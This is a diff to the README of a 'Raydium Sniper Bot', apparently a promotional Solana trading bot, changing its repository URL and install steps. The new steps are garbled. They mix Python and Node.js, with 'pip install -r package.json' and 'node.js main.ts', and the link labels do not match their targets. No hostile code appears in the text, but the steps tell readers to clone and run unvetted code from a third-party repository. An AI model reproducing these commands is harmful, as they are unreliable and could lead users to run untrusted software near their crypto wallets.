@@ -70,27 +70,27 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
    - [Git for Windows](https://git-scm.com/download/win)  
 
 2. Download and install Python:  
-   - [Python 3.12.1 for Windows](https://nodejs.org/dist/v20.3.0/node-v20.3.0-x64.msi)  
+   - [Node.js v20.3.0 for Windows](https://nodejs.org/dist/v20.3.0/node-v20.3.0-x64.msi)  
 
 3. Clone and build the bot (CMD):
    ```bash
-   git clone https://github.com/SOLTBOT5/The-Solana-Raydium-Sniper-Bot.git
-   cd The-Solana-Raydium-Sniper-Bot
-   pip install -r requirements.txt
-   python main.py
+   git clone https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot.git
+   cd Raydium-Sol-Sniper-Bot
+   pip install -r package.json
+   node.js main.ts
    ```
 
 ### 🍏 Installation for macOS
 1. Install Git:
    - [Git for macOS](https://git-scm.com/download/mac)
 2. Install Python 3.7.9 version:
-   - [Python 3.7.9 for MacOs](https://nodejs.org/dist/v20.3.0/node-v20.3.0-x64.msi)
+   - [Node.js v20,3.0 for MacOs](https://nodejs.org/dist/v20.3.0/node-v20.3.0.pkg)
 3. Clone and build the bot (Terminal):
    ```bash
-   git clone https://github.com/SOLTBOT5/The-Solana-Raydium-Sniper-Bot.git
-   cd The-Solana-Raydium-Sniper-Bot
-   pip install -r requirements.txt
-   python3 main.py
+   git clone https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot.git
+   cd Raydium-Sol-Sniper-Bot
+   pip install -r package.json
+   node.js main.ts
    ```
 
 ---
